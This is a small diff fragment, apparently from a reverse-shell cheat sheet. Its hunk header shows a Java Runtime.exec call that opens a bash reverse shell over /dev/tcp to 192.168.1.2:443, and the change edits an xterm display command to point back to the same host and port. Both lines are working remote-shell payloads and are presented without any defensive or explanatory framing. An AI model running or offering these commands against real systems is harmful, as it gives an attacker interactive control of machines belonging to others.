@@ -26,4 +26,4 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.1.2/443;cat <&5 | while r
 p.waitFor()
 
 ## xterm
-xterm -display 192.168.1.2
+xterm -display 192.168.1.2:443
